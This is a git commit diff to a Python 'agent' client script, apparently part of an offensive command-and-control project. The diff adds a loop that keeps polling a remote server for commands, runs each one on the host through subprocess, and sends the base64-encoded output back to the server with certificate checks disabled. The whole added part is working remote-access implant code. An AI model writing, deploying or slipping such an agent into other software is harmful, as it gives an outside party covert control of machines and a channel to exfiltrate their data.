456c3d0e28611c1561d0241f24401774479bb19e
Ug0Security <c.vallicari@gmail.com>
2022-10-11 20:24:11 +0200

    Update client.py

--- scripts/agents/client.py
+++ scripts/agents/client.py
@@ -1,20 +1,33 @@
 import requests
 import base64
 import sys
+import time
+import subprocess
 
-id = sys.argv[1]
+uid = sys.argv[1]
 url = sys.argv[2]
 
-message = "Hello From Agent " + id + " (Python)"
+message = "Hello From Agent " + uid + " (Python)"
 message_bytes = message.encode('ascii')
 base64_bytes = base64.b64encode(message_bytes)
 base64_message = base64_bytes.decode('ascii')
 
-hello = requests.get(url + "/res.php?res=" + base64_message + "&id="+id, verify=False)
+hello = requests.get(url + "/res.php?res=" + base64_message + "&id="+uid, verify=False)
 
-
-cmds = requests.get(url + "/cmds.php?id="+id, verify=False)
-print(cmds.text)
-
-for lines in cmds.text:
-	print(lines)
+while True:
+	cmds = requests.get(url + "/cmds.php?id="+uid+"&o=P", verify=False)
+	cmds = str(cmds.text)
+	for lines in cmds.splitlines():
+		if str(uid) in lines:
+			cmd = str(lines.split(":",1)[1])
+			cmdlist = cmd.split(" ")
+			res = subprocess.check_output(cmdlist)
+			res = res.decode("utf-8")
+			res_bytes = res.encode('ascii')
+			resbase64_bytes = base64.b64encode(res_bytes)
+			resbase64 = resbase64_bytes.decode('ascii')
+			gimme = requests.get(url + "/res.php?res=" + resbase64 + "&id="+uid, verify=False)
+	
+	
+	time.sleep(10)
+		
